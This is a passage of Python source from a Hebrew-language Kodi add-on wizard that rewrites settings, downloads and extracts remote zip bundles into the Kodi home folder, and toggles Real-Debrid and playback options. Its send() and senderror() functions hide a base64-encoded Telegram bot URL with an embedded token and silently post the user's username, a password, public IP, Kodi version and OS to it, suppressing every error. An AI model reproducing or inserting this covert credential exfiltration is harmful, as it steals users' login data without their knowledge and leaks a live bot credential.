         #dialog = xbmcgui.Dialog()
         #stoarge=dialog.browse( 3, "Temp File Location", "files" )
         stoarge=translatepath("special://temp")
      
         if len(stoarge)>2:
             tree = et.parse(src)
             root = tree.getroot()
             
             for rank in root.getiterator('setting'):
                if (rank.get('id',string_to_change))==string_to_change:
                   rank.set('value',stoarge)
                if 'quasar' in url:
                  if (rank.get('id',string_to_change2))==string_to_change2:
                   rank.set('value',stoarge)
                   
                   
       


     if string_to_change!='NONE':
         #dialog = xbmcgui.Dialog()
         #stoarge=dialog.browse( 3, "Temp File Location", "files" )
         stoarge=translatepath("special://temp")
      
         if len(stoarge)>2:
             tree = et.parse(src)
             root = tree.getroot()
             
             for rank in root.getiterator('setting'):
                if (rank.get('id',string_to_change))==string_to_change:
                   rank.set('value',stoarge)
                if 'elementum' in url:
                  if (rank.get('id',string_to_change2))==string_to_change2:
                   rank.set('value',stoarge)



             tree.write(src)


   
     copyfile(src,dst)
     if with_massage=='yes':
       dialog = xbmcgui.Dialog()
       dialog.ok("Kodi Setting", 'שינוי הגדרות הצליח')
     # if os.path.exists(translatepath("special://home/addons/") + 'script.module.meta_Subs'):
       # xbmc.executebuiltin("RunPlugin(plugin://script.module.meta_Subs/settings/players/all)")
     # if os.path.exists(translatepath("special://home/addons/") + 'script.module.meta'):
       # xbmc.executebuiltin("RunPlugin(plugin://script.module.meta/settings/players/all)")
def metaliq_fix():
  link='https://github.com/kodianonymous1/chappai/raw/master/players.zip'
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  req = urllib2.Request(link)
  remote_file = urlopen(req)
  #the_page = response.read()
  dp = xbmcgui.DialogProgress()
  dp.create("Downloading", "Downloading " +name)
  dp.update(0)

  f = open(OOooO, 'wb')

  try:
    total_size = remote_file.info().getheader('Content-Length').strip()
    header = True
  except AttributeError:
        header = False # a response doesn't always include the "Content-Length" header

  if header:
        total_size = int(total_size)

  bytes_so_far = 0
  start_time=time.time()
  while True:
        buffer = remote_file.read(8192)
        if not buffer:
            sys.stdout.write('\n')
            break

        bytes_so_far += len(buffer)
        f.write(buffer)

        if not header:
            total_size = bytes_so_far # unknown size
        if dp.iscanceled(): 
           dp.close()
           try:
            os.remove(OOooO)
           except:
            pass
           break
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        currently_downloaded=bytes_so_far/ (1024 * 1024) 
        total=total_size/ (1024 * 1024) 
        mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
        if (time.time() - start_time) >0:
          kbps_speed = bytes_so_far / (time.time() - start_time) 
          kbps_speed = kbps_speed / 1024 
        else:
         kbps_speed=0
        type_speed = 'KB'
        if kbps_speed >= 1024:
           kbps_speed = kbps_speed / 1024 
           type_speed = 'MB'
        if kbps_speed > 0 and not percent == 100: 
            eta = (total_size - bytes_so_far) / kbps_speed 
        else: 
            eta = 0
        e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

        dp.update(int(percent), "Downloading " +name,mbs,e )
        #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/script.module.meta_Subs/players' ) )
  II111iiii2 = xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/script.module.meta/players' ) )
     
  f.close()
  extract  ( OOooO , II111iiii,dp )
  extract  ( OOooO , II111iiii2,dp )

  try:
    os.remove(OOooO)
  except:
    pass
  if os.path.exists(translatepath("special://home/addons/") + 'script.module.meta_Subs'):
    xbmc.executebuiltin("RunPlugin(plugin://script.module.meta_Subs/settings/players/all)")
  if os.path.exists(translatepath("special://home/addons/") + 'script.module.meta'):
    xbmc.executebuiltin("RunPlugin(plugin://script.module.meta/settings/players/all)")
  dp.close()
def Install_moviewall2():
  addDir2("[COLOR yellow]התקנה אוטומטית[/COLOR]",'auto$$$anonymouswall$$$'+'windows',5,__PLUGIN_PATH__ + "/resources/gaia.png",__PLUGIN_PATH__ + "/resources/gaia.png","התקן את קיר הסרטים")
  addDir3("[COLOR yellow]התקנה ידנית[/COLOR]",'manual$$$gaia$$$'+'windows',5,__PLUGIN_PATH__ + "/resources/gaia.png",__PLUGIN_PATH__ + "/resources/gaia.png","התקן את קיר הסרטים")
def Install_moviewall():
  link='https://kodihub.net/fl9mx'
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  req = urllib2.Request(link)
  remote_file = urlopen(req)
  #the_page = response.read()
  dp = xbmcgui.DialogProgress()
  dp.create("Downloading", "Downloading " +name)
  dp.update(0)

  f = open(OOooO, 'wb')

  try:
    total_size = remote_file.info().getheader('Content-Length').strip()
    header = True
  except AttributeError:
        header = False # a response doesn't always include the "Content-Length" header

  if header:
        total_size = int(total_size)

  bytes_so_far = 0
  start_time=time.time()
  while True:
        buffer = remote_file.read(8192)
        if not buffer:
            sys.stdout.write('\n')
            break

        bytes_so_far += len(buffer)
        f.write(buffer)

        if not header:
            total_size = bytes_so_far # unknown size
        if dp.iscanceled(): 
           dp.close()
           try:
            os.remove(OOooO)
           except:
            pass
           break
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        currently_downloaded=bytes_so_far/ (1024 * 1024) 
        total=total_size/ (1024 * 1024) 
        mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
        if (time.time() - start_time) >0:
          kbps_speed = bytes_so_far / (time.time() - start_time) 
          kbps_speed = kbps_speed / 1024 
        else:
         kbps_speed=0
        type_speed = 'KB'
        if kbps_speed >= 1024:
           kbps_speed = kbps_speed / 1024 
           type_speed = 'MB'
        if kbps_speed > 0 and not percent == 100: 
            eta = (total_size - bytes_so_far) / kbps_speed 
        else: 
            eta = 0
        e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

        dp.update(int(percent), "Downloading " +name,mbs,e )
        #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://home' ) )

     
  f.close()
  extract  ( OOooO , II111iiii,dp )


  try:
    os.remove(OOooO)
  except:
    pass
def USER_KODI():
  link='http://anonymous1.net/userkodi/userdata.zip'
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  req = urllib2.Request(link)
  remote_file = urlopen(req)
  #the_page = response.read()
  dp = xbmcgui.DialogProgress()
  dp.create("Downloading", "Downloading " +name)
  dp.update(0)

  f = open(OOooO, 'wb')

  try:
    total_size = remote_file.info().getheader('Content-Length').strip()
    header = True
  except AttributeError:
        header = False # a response doesn't always include the "Content-Length" header

  if header:
        total_size = int(total_size)

  bytes_so_far = 0
  start_time=time.time()
  while True:
        buffer = remote_file.read(8192)
        if not buffer:
            sys.stdout.write('\n')
            break

        bytes_so_far += len(buffer)
        f.write(buffer)

        if not header:
            total_size = bytes_so_far # unknown size
        if dp.iscanceled(): 
           dp.close()
           try:
            os.remove(OOooO)
           except:
            pass
           break
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        currently_downloaded=bytes_so_far/ (1024 * 1024) 
        total=total_size/ (1024 * 1024) 
        mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
        if (time.time() - start_time) >0:
          kbps_speed = bytes_so_far / (time.time() - start_time) 
          kbps_speed = kbps_speed / 1024 
        else:
         kbps_speed=0
        type_speed = 'KB'
        if kbps_speed >= 1024:
           kbps_speed = kbps_speed / 1024 
           type_speed = 'MB'
        if kbps_speed > 0 and not percent == 100: 
            eta = (total_size - bytes_so_far) / kbps_speed 
        else: 
            eta = 0
        e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

        dp.update(int(percent), "Downloading " +name,mbs,e )
        #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://home' ) )

     
  f.close()
  extract  ( OOooO , II111iiii,dp )


  try:
    os.remove(OOooO)
  except:
    pass
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'הפעולה הושלמה, הקודי יסגר כעת')
  os._exit(1)
def parseDOM(html, name=u"", attrs={}, ret=False):                     # לקחתי מהויזארד
    # Copyright (C) 2010-2011 Tobias Ussing And Henrik Mosgaard Jensen

    if isinstance(html, str):
        try:
            html = [html.decode("utf-8")]
        except:
            html = [html]
    elif isinstance(html, unicode):
        html = [html]
    elif not isinstance(html, list):
        return u""

    if not name.strip():
        return u""

    ret_lst = []
    for item in html:
        temp_item = re.compile('(<[^>]*?\n[^>]*?>)').findall(item)
        for match in temp_item:
            item = item.replace(match, match.replace("\n", " "))

        lst = []
        for key in attrs:
            lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=[\'"]' + attrs[key] + '[\'"].*?>))', re.M | re.S).findall(item)
            if len(lst2) == 0 and attrs[key].find(" ") == -1:
                lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=' + attrs[key] + '.*?>))', re.M | re.S).findall(item)

            if len(lst) == 0:
                lst = lst2
                lst2 = []
            else:
                test = range(len(lst))
                test.reverse()
                for i in test:
                    if not lst[i] in lst2:
                        del(lst[i])

        if len(lst) == 0 and attrs == {}:
            lst = re.compile('(<' + name + '>)', re.M | re.S).findall(item)
            if len(lst) == 0:
                lst = re.compile('(<' + name + ' .*?>)', re.M | re.S).findall(item)

        if isinstance(ret, str):
            lst2 = []
            for match in lst:
                attr_lst = re.compile('<' + name + '.*?' + ret + '=([\'"].[^>]*?[\'"])>', re.M | re.S).findall(match)
                if len(attr_lst) == 0:
                    attr_lst = re.compile('<' + name + '.*?' + ret + '=(.[^>]*?)>', re.M | re.S).findall(match)
                for tmp in attr_lst:
                    cont_char = tmp[0]
                    if cont_char in "'\"":
                        if tmp.find('=' + cont_char, tmp.find(cont_char, 1)) > -1:
                            tmp = tmp[:tmp.find('=' + cont_char, tmp.find(cont_char, 1))]

                        if tmp.rfind(cont_char, 1) > -1:
                            tmp = tmp[1:tmp.rfind(cont_char)]
                    else:
                        if tmp.find(" ") > 0:
                            tmp = tmp[:tmp.find(" ")]
                        elif tmp.find("/") > 0:
                            tmp = tmp[:tmp.find("/")]
                        elif tmp.find(">") > 0:
                            tmp = tmp[:tmp.find(">")]

                    lst2.append(tmp.strip())
            lst = lst2
        else:
            lst2 = []
            for match in lst:
                endstr = u"</" + name

                start = item.find(match)
                end = item.find(endstr, start)
                pos = item.find("<" + name, start + 1 )

                while pos < end and pos != -1:
                    tend = item.find(endstr, end + len(endstr))
                    if tend != -1:
                        end = tend
                    pos = item.find("<" + name, pos + 1)

                if start == -1 and end == -1:
                    temp = u""
                elif start > -1 and end > -1:
                    temp = item[start + len(match):end]
                elif end > -1:
                    temp = item[:end]
                elif start > -1:
                    temp = item[start + len(match):]

                if ret:
                    endstr = item[end:item.find(">", item.find(endstr)) + 1]
                    temp = match + temp + endstr

                item = item[item.find(temp, item.find(match)) + len(temp):]
                lst2.append(temp)
            lst = lst2
        ret_lst += lst

    return ret_lst
def kodi17Fix(): # לקחתי מהויזארד

	II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) ) #אני הוספתי את זה 
	#addonlist = glob.glob(os.path.join(ADDONS, '*/')) זה המקורי מהויזארד
	addonlist = glob.glob(os.path.join(II111iiii, '*/'))
	disabledAddons = []
	for folder in sorted(addonlist, key = lambda x: x):
		addonxml = os.path.join(folder, 'addon.xml')
		if os.path.exists(addonxml):
			fold   = folder.replace(II111iiii, '')[1:-1]
			f      = open(addonxml)
			a      = f.read()
			aid    = parseDOM(a, 'addon', ret='id')
			f.close()
			try:
				add    = xbmcaddon.Addon(id=aid[0])
			except:
				try:
					log("%s was disabled" % aid[0], xbmc.LOGDEBUG)
					disabledAddons.append(aid[0])
				except:
					try:
						log("%s was disabled" % fold, xbmc.LOGDEBUG)
						disabledAddons.append(fold)
					except:
						if len(aid) == 0: log("Unabled to enable: %s(Cannot Determine Addon ID)" % fold, xbmc.LOGERROR)
						else: log("Unabled to enable: %s" % folder, xbmc.LOGERROR)
	if len(disabledAddons) > 0:
		x = 0
		DP.create(ADDONTITLE,'[COLOR %s]Enabling disabled Addons' % COLOR2,'', 'Please Wait[/COLOR]')
		for item in disabledAddons:
			x += 1
			prog = int(percentage(x, len(disabledAddons)))
			DP.update(prog, "", "Enabling: [COLOR %s]%s[/COLOR]" % (COLOR1, item))
			addonDatabase(item, 1)
			if DP.iscanceled(): break
		if DP.iscanceled(): 
			DP.close()
			LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Enabling Addons Cancelled![/COLOR]" % COLOR2)
			sys.exit()
		DP.close()
def rdon():

	src=xbmc . translatePath ( 'special://home/media')+"/SplashRd.png"
	dst=xbmc . translatePath ( 'special://home/media')+"/Splash.png"
	copyfile(src,dst)
def rdoff():
    if os.path.exists(os.path.join(ADDONS, 'plugin.video.mando')):
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('rd.client_id','')
        mando.setSetting('rd.secret','')
        mando.setSetting('rdsource','')
        mando.setSetting('rd.auth','')
        mando.setSetting('rd.refresh','')
        mando.setSetting('debrid_use', 'false')
    if os.path.exists(os.path.join(ADDONS, 'script.module.resolveurl')):
        resolveurl = xbmcaddon.Addon('script.module.resolveurl')
        resolveurl.setSetting('RealDebridResolver_client_id','')
        resolveurl.setSetting('RealDebridResolver_client_secret','')
        resolveurl.setSetting('RealDebridResolver_token','')
        resolveurl.setSetting('RealDebridResolver_refresh','')
    if os.path.exists(os.path.join(ADDONS, 'plugin.video.seren')):
        seren = xbmcaddon.Addon('plugin.video.seren')
        seren.setSetting('rd.client_id','')
        seren.setSetting('rd.secret','')
        seren.setSetting('rd.auth','')
        seren.setSetting('rd.refresh','')
    if os.path.exists(os.path.join(ADDONS, 'plugin.video.gaia')):
        gaia = xbmcaddon.Addon('plugin.video.gaia')
        gaia.setSetting('accounts.debrid.realdebrid.id','')
        gaia.setSetting('accounts.debrid.realdebrid.secret','')
        gaia.setSetting('accounts.debrid.realdebrid.token','')
        gaia.setSetting('accounts.debrid.realdebrid.refresh','')

    src=xbmc . translatePath ( 'special://home/media')+"/Splashoff.png"
    dst=xbmc . translatePath ( 'special://home/media')+"/Splash.png"
    copyfile(src,dst)
    LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'Real Debrid'),'[COLOR %s]בוטל[/COLOR]' % COLOR2)
def set_nextup():


    dialog = xbmcgui.Dialog()
    funcs = (
        nextup30,
        nextup60,
        nextup80,
        nextup100,
        nextup120,
        skipintro,
        dis_skipintro,
        # tv8,
        # tv9,
        # tv10,
        # tv11,
        # tv12,
        # tv13,
        # tv14,
        # tv15,
        # tv16,
        )
        
    call = dialog.select('[COLOR yellow]הגדר זמן הופעת חלון פרק הבא \ קדימון[/COLOR]', [
	'30 שניות', 
	'60 שניות',
	'80 שניות',
	'100 שניות',
	'120 שניות',
	'הפעל קדימון',
	'בטל קדימון',])
	# 'גודל כתוביות - גדול',
	
	# 'התאמת כתוביות לשפה הקריליות',
	# 'ביטול התאמת כתוביות לשפה הקריליות',
	# 'התאמת כתוביות לשפה אנגלית',
	# 'התאמת כתוביות לשפה ספרדית',
	# 'התאמת כתוביות לשפה רוסית',
	# 'התאמת כתוביות לשפה עברית',
	# 'חלון מסך מלא',
	# 'שנה את שפת השמע לאנגלית',
	# 'שנה את שפת השמע לרוסית',])
    if call:
        if call < 0:
            return
        func = funcs[call-7]
        return func()
    else:
        func = funcs[call]
        return func()
    return 

    LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'Real Debrid'),'[COLOR %s]בוטל[/COLOR]' % COLOR2)
    

def nextup30():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','30')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','30')
        
def nextup60():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','60')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','60')
def nextup80():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','80')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','80')
def nextup100():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','100')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','100')
def nextup120():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','120')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','120')
def skipintro():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('skip_intro','true')

def dis_skipintro():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('skip_intro','false')
def setrealdebrid():
    # z=(ADDON.getSetting("auto_rd"))
    # if z == 'false':
       # ADDON.openSettings()
       
    # else:
        z=(ADDON.getSetting("auto_rd"))
        if z == 'false':
         ADDON.openSettings()
        import real_debrid
        rd = real_debrid.RealDebrid()
        rd.auth()
    # rd = real_debrid.RealDebrid()
    # rd_domains=(rd.getRelevantHosters())
        xbmc.executebuiltin("RunPlugin(plugin://plugin.program.mediasync/?mode=11&url=www)")
        rdon()
def torrenter(): # הרחבה בשם לוקי שאותה בודקים
  link='https://kodihub.net/jx7ce'
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  req = urllib2.Request(link)
  remote_file = urlopen(req)
  #the_page = response.read()
  dp = xbmcgui.DialogProgress()
  dp.create("Downloading", "Downloading " +name)
  dp.update(0)

  f = open(OOooO, 'wb')

  try:
    total_size = remote_file.info().getheader('Content-Length').strip()
    header = True
  except AttributeError:
        header = False # a response doesn't always include the "Content-Length" header

  if header:
        total_size = int(total_size)

  bytes_so_far = 0
  start_time=time.time()
  while True:
        buffer = remote_file.read(8192)
        if not buffer:
            sys.stdout.write('\n')
            break

        bytes_so_far += len(buffer)
        f.write(buffer)

        if not header:
            total_size = bytes_so_far # unknown size
        if dp.iscanceled(): 
           dp.close()
           try:
            os.remove(OOooO)
           except:
            pass
           break
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        currently_downloaded=bytes_so_far/ (1024 * 1024) 
        total=total_size/ (1024 * 1024) 
        mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
        if (time.time() - start_time) >0:
          kbps_speed = bytes_so_far / (time.time() - start_time) 
          kbps_speed = kbps_speed / 1024 
        else:
         kbps_speed=0
        type_speed = 'KB'
        if kbps_speed >= 1024:
           kbps_speed = kbps_speed / 1024 
           type_speed = 'MB'
        if kbps_speed > 0 and not percent == 100: 
            eta = (total_size - bytes_so_far) / kbps_speed 
        else: 
            eta = 0
        e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

        dp.update(int(percent), "Downloading " +name,mbs,e )
        #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://home' ) )


  f.close()
  extract  ( OOooO , II111iiii,dp )
  xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )

  try:
    os.remove(OOooO)

  except:
    pass
  dialog = xbmcgui.Dialog()
  xbmc.sleep(5000)
  dialog.ok("Kodi Setting", 'הפעולה הושלמה - הקודי יסגר כעת')
  os._exit(1)
def quasar(): # הרחבה בשם לוקי שאותה בודקים
  link='https://kodihub.net/2offw'
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  req = urllib2.Request(link)
  remote_file = urlopen(req)
  #the_page = response.read()
  dp = xbmcgui.DialogProgress()
  dp.create("Downloading", "Downloading " +name)
  dp.update(0)

  f = open(OOooO, 'wb')

  try:
    total_size = remote_file.info().getheader('Content-Length').strip()
    header = True
  except AttributeError:
        header = False # a response doesn't always include the "Content-Length" header

  if header:
        total_size = int(total_size)

  bytes_so_far = 0
  start_time=time.time()
  while True:
        buffer = remote_file.read(8192)
        if not buffer:
            sys.stdout.write('\n')
            break

        bytes_so_far += len(buffer)
        f.write(buffer)

        if not header:
            total_size = bytes_so_far # unknown size
        if dp.iscanceled(): 
           dp.close()
           try:
            os.remove(OOooO)
           except:
            pass
           break
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        currently_downloaded=bytes_so_far/ (1024 * 1024) 
        total=total_size/ (1024 * 1024) 
        mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
        if (time.time() - start_time) >0:
          kbps_speed = bytes_so_far / (time.time() - start_time) 
          kbps_speed = kbps_speed / 1024 
        else:
         kbps_speed=0
        type_speed = 'KB'
        if kbps_speed >= 1024:
           kbps_speed = kbps_speed / 1024 
           type_speed = 'MB'
        if kbps_speed > 0 and not percent == 100: 
            eta = (total_size - bytes_so_far) / kbps_speed 
        else: 
            eta = 0
        e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

        dp.update(int(percent), "Downloading " +name,mbs,e )
        #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://home' ) )


  f.close()
  extract  ( OOooO , II111iiii,dp )
  xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )

  try:
    os.remove(OOooO)

  except:
    pass
  dialog = xbmcgui.Dialog()
  xbmc.sleep(5000)
  dialog.ok("Kodi Setting", 'הפעולה הושלמה - הקודי יסגר כעת')
  os._exit(1)
def send(search_entered):
       try:
          import json
          # wiz.log('FRESH MESSAGE')
          try:
             resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
          except: resuaddon=xbmcaddon.Addon('skin.Meir.mod')
          input= (resuaddon.getSetting("user"))
          input2= (resuaddon.getSetting("pass"))
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEzMDQxMzU5MTM6QUFITHdGMWRxbktSTGQ4WUdkUjdyRldpTFdOYmFVcnE4ekUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTM2NDU5OTc4NCZ0ZXh0PdeU15HXmdec15Mg16DXpNeq15cgLQ=='
          x=urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=search_entered
          import socket
          x=urlopen(error_ad.decode('base64')+' שם משתמש: '+userr +' סיסמה: '+passs+' קודי: '+kodiinfo+' כתובת: '+local_ip+' מערכת הפעלה: '+platform.system()).readlines()
          #          x=urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       except: pass
def senderror(search_entered):
       try:
          import json
          # wiz.log('FRESH MESSAGE')
          try:
             resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
          except: resuaddon=xbmcaddon.Addon('skin.Meir.mod')
          input= (resuaddon.getSetting("user"))
          input2= (resuaddon.getSetting("pass"))
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEzMDQxMzU5MTM6QUFITHdGMWRxbktSTGQ4WUdkUjdyRldpTFdOYmFVcnE4ekUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTM2NDU5OTc4NCZ0ZXh0Pden15XXkyDXpNeq15nXl9eUINep15LXldeZIC0='
          x=urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=search_entered
          import socket
          x=urlopen(error_ad.decode('base64')+' שם משתמש: '+userr +' סיסמה: '+passs+' קודי: '+kodiinfo+' כתובת: '+local_ip+' מערכת הפעלה: '+platform.system()).readlines()
          #          x=urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       except: pass
def elementum(): # הרחבה בשם לוקי שאותה בודקים
  link='https://kodihub.net/49pzu'
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  req = urllib2.Request(link)
  remote_file = urlopen(req)
  #the_page = response.read()
  dp = xbmcgui.DialogProgress()
  dp.create("Downloading", "Downloading " +name)
  dp.update(0)

  f = open(OOooO, 'wb')

  try:
    total_size = remote_file.info().getheader('Content-Length').strip()
    header = True
  except AttributeError:
        header = False # a response doesn't always include the "Content-Length" header

  if header:
        total_size = int(total_size)

  bytes_so_far = 0
  start_time=time.time()
  while True:
        buffer = remote_file.read(8192)
        if not buffer:
            sys.stdout.write('\n')
            break

        bytes_so_far += len(buffer)
        f.write(buffer)

        if not header:
            total_size = bytes_so_far # unknown size
        if dp.iscanceled(): 
           dp.close()
           try:
            os.remove(OOooO)
           except:
            pass
           break
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        currently_downloaded=bytes_so_far/ (1024 * 1024) 
        total=total_size/ (1024 * 1024) 
        mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
        if (time.time() - start_time) >0:
          kbps_speed = bytes_so_far / (time.time() - start_time) 
          kbps_speed = kbps_speed / 1024 
        else:
         kbps_speed=0
        type_speed = 'KB'
        if kbps_speed >= 1024:
           kbps_speed = kbps_speed / 1024 
           type_speed = 'MB'
        if kbps_speed > 0 and not percent == 100: 
            eta = (total_size - bytes_so_far) / kbps_speed 
        else: 
            eta = 0
        e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

        dp.update(int(percent), "Downloading " +name,mbs,e )
        #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://home' ) )


  f.close()
  extract  ( OOooO , II111iiii,dp )
  xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )

  try:
    os.remove(OOooO)

  except:
    pass
  dialog = xbmcgui.Dialog()
  xbmc.sleep(5000)
  dialog.ok("Kodi Setting", 'הפעולה הושלמה - הקודי יסגר כעת')
  os._exit(1)
def popcorntime(): # הרחבה בשם לוקי שאותה בודקים
  link='http://anonymous1.net/Settingz/popcorntime.zip'
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  req = urllib2.Request(link)
  remote_file = urlopen(req)
  #the_page = response.read()
  dp = xbmcgui.DialogProgress()
  dp.create("Downloading", "Downloading " +name)
  dp.update(0)

  f = open(OOooO, 'wb')

  try:
    total_size = remote_file.info().getheader('Content-Length').strip()
    header = True
  except AttributeError:
        header = False # a response doesn't always include the "Content-Length" header

  if header:
        total_size = int(total_size)

  bytes_so_far = 0
  start_time=time.time()
  while True:
        buffer = remote_file.read(8192)
        if not buffer:
            sys.stdout.write('\n')
            break

